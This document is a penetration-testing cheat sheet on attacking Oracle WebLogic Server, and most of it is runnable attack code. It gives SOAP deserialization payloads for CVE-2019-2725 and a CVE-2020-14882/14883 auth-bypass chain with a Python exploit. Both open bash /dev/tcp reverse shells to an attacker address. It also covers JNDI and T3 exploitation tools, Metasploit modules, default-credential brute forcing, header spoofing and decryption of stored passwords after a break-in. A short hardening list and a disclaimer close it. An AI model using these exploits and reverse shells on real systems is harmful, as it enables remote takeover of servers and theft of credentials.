---
title: "Oracle WebLogic Server"
date: 2026-02-24
draft: false
---

## Overview

Oracle WebLogic Server is a Java EE application server widely deployed in enterprise and financial sector environments. It is one of the most targeted middleware products due to its proprietary T3 protocol, IIOP support, and long history of critical deserialization vulnerabilities. WebLogic CVEs frequently receive CVSS 9.8 scores and have been used in ransomware deployment, cryptomining campaigns, and APT lateral movement.

**Default Ports:**
| Port | Service |
|------|---------|
| 7001 | HTTP (Admin Console, T3, IIOP — all multiplexed) |
| 7002 | HTTPS (Admin Console, T3S, IIOPS) |
| 7003 | HTTP (managed servers) |
| 7004 | HTTPS (managed servers) |
| 7070 | HTTP alternative |
| 4007 | Coherence cluster |
| 5556 | Node Manager |

> **T3 and IIOP on 7001:** Both T3 and IIOP are multiplexed on port 7001. Connection filters that block T3 often do not block IIOP. Test both protocols independently.

---

## Recon and Fingerprinting

```bash
nmap -sV -p 7001,7002,7003,7004,5556 TARGET_IP
nmap -p 7001 --script http-title,http-headers TARGET_IP

# WebLogic Admin Console
curl -sv http://TARGET_IP:7001/console/ 2>&1 | grep -iE "server:|weblogic|oracle"

# T3 protocol banner
echo -n "t3 12.2.1\nAS:255\nHL:19\n\n" | nc TARGET_IP 7001 | strings | head -20

# Error page fingerprinting
curl -s http://TARGET_IP:7001/nonexistent_$(date +%s) | grep -i "weblogic\|oracle\|wls"

# Version from error responses
curl -s http://TARGET_IP:7001/bea_wls_internal/ | grep -iE "version|weblogic"
```

### Version Detection

```bash
# Check common version-revealing endpoints
curl -s http://TARGET_IP:7001/bea_wls_internal/

# UDDI registry (if deployed)
curl -s http://TARGET_IP:7001/uddi/

# WSDL endpoints
curl -s "http://TARGET_IP:7001/wls-wsat/CoordinatorPortType?wsdl"

# Clusterview (reveals version)
curl -s http://TARGET_IP:7001/clusterview/

# Internal diagnostics (older versions)
curl -s http://TARGET_IP:7001/bea_wls_deployment_internal/DeploymentService?wsdl
```

---

## CVE-2019-2725 — XMLDecoder Deserialization RCE (wls9_async)

**CVSS:** 9.8 Critical
**Affected:** WebLogic 10.3.6.0, 12.1.3.0 with `wls9_async` component installed
**Type:** Java XMLDecoder deserialization in the `wls9_async` async response component
**CWE:** CWE-502
**Exploited in the wild:** Yes (cryptomining, ransomware)

> **Component clarification:** CVE-2019-2725 is a vulnerability in the `wls9_async` component, exploiting missing input filtering on XMLDecoder in the async SOAP handler. It is NOT an Oracle Coherence issue. CVE-2020-14882/14883 involves Coherence gadget chains for post-auth-bypass RCE — these are distinct vulnerabilities. Do not conflate them.

### Vulnerability Details

The `wls9_async` component handles asynchronous SOAP responses. It deserializes Java objects from HTTP POST requests using `java.beans.XMLDecoder` without authentication or input filtering. Attackers send a crafted SOAP request with a malicious `<work:WorkContext>` element containing XMLDecoder-parsed Java object instructions, resulting in arbitrary command execution.

### Vulnerable Endpoints

```bash
# Check if vulnerable endpoints exist
for endpoint in \
  "/_async/AsyncResponseService" \
  "/wls-wsat/CoordinatorPortType" \
  "/wls-wsat/RegistrationPortTypeRPC" \
  "/wls-wsat/ParticipantPortType" \
  "/_async/AsyncResponseServiceJms" \
  "/_async/AsyncResponseServiceHttps"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:7001$endpoint")
  echo "$CODE : $endpoint"
done
```

### PoC — Command Execution

```bash
# Check for CVE-2019-2725 via WSDL exposure
curl -s "http://TARGET_IP:7001/_async/AsyncResponseService?wsdl" | grep -i "wsdl\|definitions"

# Exploit — send malicious SOAP request
curl -s -X POST "http://TARGET_IP:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: ''" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:wsa="http://www.w3.org/2005/08/addressing"
  xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/cve2019-2725.txt</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body>
    <asy:onAsyncDelivery/>
  </soapenv:Body>
</soapenv:Envelope>'

# Reverse shell variant
LHOST="YOUR_IP"
LPORT="4444"
curl -s -X POST "http://TARGET_IP:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: ''" \
  -d "<?xml version=\"1.0\" encoding=\"utf-8\"?>
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"
  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">
      <java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">
        <object class=\"java.lang.ProcessBuilder\">
          <array class=\"java.lang.String\" length=\"3\">
            <void index=\"0\"><string>/bin/bash</string></void>
            <void index=\"1\"><string>-c</string></void>
            <void index=\"2\"><string>bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1</string></void>
          </array>
          <void method=\"start\"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>"
```

---

## CVE-2020-14882 / CVE-2020-14883 — Auth Bypass + RCE

**CVSS:** 9.8 (14882) + 7.2 (14883)
**Affected:** WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0
**Type:** Authentication bypass (14882) chained with console RCE (14883)
**Exploited in the wild:** Yes (widely exploited within days of patch)

### Vulnerability Details

CVE-2020-14882 allows unauthenticated access to the WebLogic Admin Console by bypassing authentication using URL encoding tricks. CVE-2020-14883 allows executing server-side code through the `com.tangosol.coherence.mvel2.sh.ShellSession` or `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` classes accessible post-auth-bypass.

### CVE-2020-14882 — Auth Bypass PoC

```bash
# Normal admin console — requires auth
curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:7001/console/css/%252E%252E%252Fconsole.portal"

# Auth bypass via double encoding
curl -v "http://TARGET_IP:7001/console/css/%252E%252E%252Fconsole.portal"

# Alternative bypass patterns
curl -v "http://TARGET_IP:7001/console/images/%252E%252E%252Fconsole.portal"
curl -v "http://TARGET_IP:7001/console/%252E%252E/console.portal"
curl -v "http://TARGET_IP:7001/console/css/%252e%252e%252fconsole.portal"
```

### CVE-2020-14883 — RCE via Console

```bash
# After bypassing auth, exploit console RCE
# Method 1: Using com.tangosol.coherence.mvel2.sh.ShellSession
curl -s -X POST \
  "http://TARGET_IP:7001/console/css/%252E%252E%252Fconsole.portal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession"

# Method 2: Using FileSystemXmlApplicationContext (load remote Spring XML)
# Step 1: Host malicious Spring XML bean file
cat > /tmp/evil_spring.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
EOF
python3 -m http.server 8000 -d /tmp/ &

# Step 2: Trigger RCE
curl -s "http://TARGET_IP:7001/console/css/%252E%252E%252Fconsole.portal" \
  -d "_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&contextURL=http://YOUR_IP:8000/evil_spring.xml"
```

### Python Exploit Script

```python
#!/usr/bin/env python3
"""
CVE-2020-14882 + CVE-2020-14883 WebLogic Auth Bypass + RCE
"""
import requests
import sys
import urllib3
urllib3.disable_warnings()

TARGET = "http://TARGET_IP:7001"
LHOST = "YOUR_IP"
LPORT = "4444"
SPRING_URL = f"http://{LHOST}:8000/evil_spring.xml"

def check_bypass():
    url = f"{TARGET}/console/css/%252E%252E%252Fconsole.portal"
    try:
        r = requests.get(url, verify=False, timeout=10, allow_redirects=False)
        if r.status_code == 200 and "WebLogic" in r.text:
            print(f"[+] CVE-2020-14882 auth bypass confirmed!")
            return True
        print(f"[-] Auth bypass failed: {r.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def exploit_rce():
    url = f"{TARGET}/console/css/%252E%252E%252Fconsole.portal"
    data = {
        "_nfpb": "true",
        "_pageLabel": "HomePage1",
        "handle": "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext",
        "contextURL": SPRING_URL
    }
    try:
        r = requests.post(url, data=data, verify=False, timeout=15)
        print(f"[*] RCE response: {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"[-] RCE error: {e}")

if check_bypass():
    print(f"[*] Attempting RCE via Spring XML: {SPRING_URL}")
    exploit_rce()
```

---

## CVE-2021-2109 — LDAP Injection / JNDI RCE

**CVSS:** 7.2 High
**Affected:** WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0
**Type:** JNDI injection via T3/IIOP
**CWE:** CWE-74

### Vulnerability Details

WebLogic's T3 and IIOP protocols support JNDI lookups. By supplying a crafted JNDI URL pointing to an attacker-controlled LDAP/RMI server (similar to Log4Shell), an authenticated or sometimes unauthenticated user could trigger remote class loading and execution.

```bash
# Check if T3 is accessible
python3 -c "
import socket
s = socket.socket()
s.connect(('TARGET_IP', 7001))
s.send(b't3 12.2.1\nAS:255\nHL:19\n\n')
print(s.recv(1024))
"

# JNDI test with LDAP callback (use with JNDIExploit or JNDI-Exploit-Kit)
# Start LDAP exploit server
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i YOUR_IP -p 1389 -l 8888

# Trigger JNDI lookup via WebLogic T3 protocol
# (requires specific gadget based on WebLogic version — use ysoserial T3 modules)
```

---

## CVE-2023-21839 — JNDI Injection via T3/IIOP

**CVSS:** 7.5 High
**Affected:** WebLogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0
**Type:** Unauthenticated JNDI injection via T3/IIOP
**Exploited in the wild:** Yes

### Vulnerability Details

WebLogic's T3 and IIOP network protocols allowed unauthenticated remote JNDI lookup, which could be directed to an attacker-controlled server. This is similar to Log4Shell but in the WebLogic protocol stack. The lookup causes WebLogic to connect out to an arbitrary server and potentially load and execute a remote class.

```bash
# CVE-2023-21839 PoC using Python
python3 -c "
import socket
import struct

# Connect to T3 port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('TARGET_IP', 7001))

# T3 protocol handshake
s.send(b't3 12.2.1\nAS:255\nHL:19\n\n')
resp = s.recv(1024)
print('Banner:', resp)
"

# Use specialized tool (CVE-2023-21839-exploit)
git clone https://github.com/4ra1n/CVE-2023-21839
cd CVE-2023-21839
java -jar CVE-2023-21839.jar TARGET_IP 7001 "ldap://YOUR_IP:1389/Exploit"
```

---

## T3 Protocol Attacks

The T3 protocol is WebLogic's proprietary RMI protocol. It enables Java object serialization over the network.

```bash
# T3 deserialization with ysoserial
# Generate T3-wrapped payload
java -cp ysoserial-all.jar ysoserial.exploit.WebLogicPayloadInjectingServer YOUR_IP 8001 \
  CommonsCollections1 "bash -c {echo,BASE64}|{base64,-d}|bash"

# Using weblogic-framework
git clone https://github.com/0nise/weblogic-framework
cd weblogic-framework
java -jar weblogic-framework.jar -ip TARGET_IP -port 7001 -cmd "id"
```

---

## Console Bypass and Admin Enumeration

```bash
# Enumerate admin console paths
for path in \
  "/console" \
  "/console/login/LoginForm.jsp" \
  "/console/css/" \
  "/console/images/" \
  "/em" \
  "/em/faces/WlsLoginPage.jspx" \
  "/wls-wsat/" \
  "/_async/" \
  "/bea_wls_internal/" \
  "/bea_wls_cluster_internal/"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:7001$path")
  echo "$CODE : $path"
done

# Admin console default credentials
for cred in "weblogic:weblogic1" "weblogic:Welcome1" "weblogic:weblogic" "system:password" "admin:admin" "admin:Admin1234"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -c /tmp/wl_cookie.txt \
    --data "j_username=$user&j_password=$pass&j_character_encoding=UTF-8" \
    "http://TARGET_IP:7001/console/j_security_check")
  echo "$cred -> $CODE"
done
```

---

## IIOP Protocol Attacks

```bash
# IIOP is on 7001 alongside T3
# Check IIOP availability
nmap -p 7001 --script=iiop-info TARGET_IP

# IIOP deserialization test
python3 -c "
import socket
# GIOP 1.2 LocateRequest
giop_header = b'GIOP\x01\x02\x01\x00'  # GIOP magic + version + flags
print('Testing IIOP...')
s = socket.socket()
s.connect(('TARGET_IP', 7001))
s.send(giop_header)
print(s.recv(512))
"
```

---

## Metasploit Modules

```bash
msfconsole -q

# CVE-2019-2725
use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
set RHOSTS TARGET_IP
set RPORT 7001
set LHOST YOUR_IP
run

# CVE-2020-14882/14883
use exploit/multi/http/oracle_weblogic_wls_wsat_patch_bypass_rce
set RHOSTS TARGET_IP
set LHOST YOUR_IP
run

# T3 deserialization
use exploit/multi/misc/weblogic_deserialize_badattr_extcomp
set RHOSTS TARGET_IP
set RPORT 7001
set LHOST YOUR_IP
run

# Auxiliary scanner
use auxiliary/scanner/http/weblogic_login
set RHOSTS TARGET_IP
set RPORT 7001
run
```

---

## Full Attack Chain Summary

```
1. Discovery: nmap -sV -p 7001,7002,7003,7004,5556
   └─ Banner, T3 handshake, error page analysis

2. Version detection
   └─ /console/login/LoginForm.jsp
   └─ T3 protocol banner

3. Check for unauthenticated endpoints
   └─ /_async/AsyncResponseService (CVE-2019-2725)
   └─ /wls-wsat/ endpoints

4. If CVE-2019-2725 applicable:
   └─ Send SOAP XML deserialization payload
   └─ Reverse shell via ProcessBuilder

5. If newer version (12.x/14.x):
   └─ CVE-2020-14882 auth bypass
   └─ CVE-2020-14883 Spring XML RCE
   └─ Load evil_spring.xml from YOUR_IP

6. If T3/IIOP accessible:
   └─ CVE-2023-21839 JNDI injection
   └─ Direct to JNDI exploit server

7. Post-exploitation:
   └─ Read domain config.xml (DS credentials)
   └─ Extract keystore files
   └─ Access internal database via configured datasources
```

---

## Port 5556 — Node Manager

The Node Manager service on port 5556 manages WebLogic managed servers (start, stop, deploy). It is often underestimated during assessments.

- If not configured to require SSL, Node Manager accepts management commands in cleartext
- Node Manager can be used to start/stop managed servers and trigger application deployments
- In unpatched configurations, it may accept commands without proper authentication

```bash
# Detect Node Manager
nmap -sV -p 5556 TARGET_IP

# Check if SSL is enforced — plain TCP connection probe
echo -e "VERSION\n" | nc TARGET_IP 5556 | head -5
# If a version banner is returned without SSL error → SSL not enforced

# Metasploit module for Node Manager
use auxiliary/scanner/weblogic/weblogic_nodemanager_login
set RHOSTS TARGET_IP
set RPORT 5556
run
```

---

## IIOP on Port 7001

IIOP (Internet Inter-ORB Protocol) is multiplexed on the same port 7001 alongside T3 in WebLogic. This is a frequently overlooked attack surface:

- Administrators who disable T3 (via connection filters) often leave IIOP enabled
- IIOP supports JNDI lookups and can be exploited for deserialization (CVE-2023-21839, CVE-2021-2109)
- Always test IIOP separately, even when T3 is confirmed blocked

Add to port reconnaissance:

```bash
# Check IIOP via GIOP magic bytes
python3 -c "
import socket
s = socket.socket()
s.connect(('TARGET_IP', 7001))
s.send(b'GIOP\x01\x02\x01\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01')
print(s.recv(512))
"

# nmap IIOP script
nmap -p 7001 --script=iiop-info TARGET_IP
```

---

## Fingerprinting via Serialized Object Endpoint

```bash
# Check if the internal class endpoint is accessible — reveals WebLogic version
curl -I http://TARGET_IP:7001/bea_wls_internal/classes/AppletArchiver.class

# 200 response = WebLogic fingerprint confirmed + potential deserialization vector
# The presence of this endpoint indicates WebLogic's internal classloader is accessible
# which correlates with older, likely unpatched deployments

# Additional fingerprinting endpoints
curl -I http://TARGET_IP:7001/bea_wls_internal/
curl -s http://TARGET_IP:7001/bea_wls_internal/ | grep -i "weblogic\|version"
```

---

## CVE-2023-21931 — JNDI via BindingEnumeration

**CVSS:** 7.5 High
**Affected:** WebLogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0
**Type:** JNDI injection bypass via T3/IIOP BindingEnumeration
**Relation:** Evolution of CVE-2023-21839

### Vulnerability Details

After some deployments patched CVE-2023-21839, researchers identified that `lookup()` calls on objects already present in the RMI registry could be redirected to a malicious LDAP server via `BindingEnumeration`. This bypasses certain CVE-2023-21839 patches by using a different code path in the JNDI resolution chain.

**Attack approach:** The attacker enumerates bindings in the WebLogic RMI registry and triggers a `lookup()` on an enumerated binding that redirects to an attacker-controlled LDAP server. The LDAP server returns a serialized object or class reference that is executed by WebLogic.

**Reference tool:** `WLST3Exploit` automates T3 protocol interaction and BindingEnumeration-based JNDI injection.

```bash
# CVE-2023-21839 PoC (prerequisite — check if patched for 21839 first)
git clone https://github.com/4ra1n/CVE-2023-21839
java -jar CVE-2023-21839.jar TARGET_IP 7001 "ldap://YOUR_IP:1389/Exploit"

# If CVE-2023-21839 is patched, test CVE-2023-21931 via BindingEnumeration path
# using WLST3Exploit or a custom T3 client that performs binding enumeration
```

---

## Post-Exploitation — Credential Extraction

WebLogic stores datasource and admin passwords encrypted in `config.xml`. The AES/3DES decryption key is stored in `SerializedSystemIni.dat`. Both files together allow full password recovery.

```bash
# Locate the key file
find / -name "SerializedSystemIni.dat" 2>/dev/null
# Typical path: /u01/oracle/user_projects/domains/<domain>/security/SerializedSystemIni.dat

# Locate the config file
find / -name "config.xml" 2>/dev/null | grep -i domain
# Typical path: /u01/oracle/user_projects/domains/base_domain/config/config.xml

# Extract encrypted passwords from config.xml
grep -i "password\|credential" /u01/oracle/user_projects/domains/base_domain/config/config.xml

# Decrypt passwords using decryptWLS.py (requires both files)
# Tool: https://github.com/NetSPI/WebLogicPasswordDecryptor
python decryptWLS.py SerializedSystemIni.dat config.xml
```

---

## Connection Filters Bypass — T3 over HTTP Tunneling

WebLogic T3 can be encapsulated inside HTTP when the `HttpClnt` tunneling servlet is enabled. This bypasses IP-based connection filters that check the port or protocol at the network layer but do not inspect the application layer:

```bash
# T3 over HTTP tunneling endpoint
curl -v http://TARGET_IP:7001/HTTPClnt

# This encapsulates T3 inside HTTP — useful when:
# - Direct T3 (port 7001 raw) is filtered by WebLogic connection filters
# - Network firewall allows HTTP/443 but the T3 filter rejects non-HTTP T3 connections
# - Exploits that use T3 can be tunneled through this endpoint

# Test if tunneling is enabled
curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:7001/HTTPClnt
# 200 or 400 (not 404) = servlet is present
```

---

## Console Bypass via Forwarded Headers

Some WebLogic versions respond to admin console requests when an internal IP is spoofed via forwarded headers, even when the console appears to be disabled or restricted:

```bash
# Attempt console access spoofing internal source IP
curl -H "X-Forwarded-For: 127.0.0.1" http://TARGET_IP:7001/console/console.portal
curl -H "X-Forwarded-For: 127.0.0.1" http://TARGET_IP:7001/console/login/LoginForm.jsp

# Additional header variants
curl -H "X-Real-IP: 127.0.0.1" http://TARGET_IP:7001/console/login/LoginForm.jsp
curl -H "X-Originating-IP: 127.0.0.1" http://TARGET_IP:7001/console/login/LoginForm.jsp

# If any returns 200 with the login form → console is accessible via header bypass
```

---

## Hardening Recommendations

- Apply CPU (Critical Patch Update) patches quarterly
- Disable wls9_async and wls-wsat if not needed
- Restrict T3 and IIOP access to trusted IP ranges
- Enable WebLogic Connection Filters for T3: `weblogic.security.net.ConnectionFilter`
- Use strong, unique credentials for the admin console
- Enable SSL/TLS for all communications (T3S, HTTPS)
- Run WebLogic as a non-root dedicated service account
- Enable audit logging for all admin console operations
- Deploy WebLogic behind a WAF with rules for serialization payload patterns


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.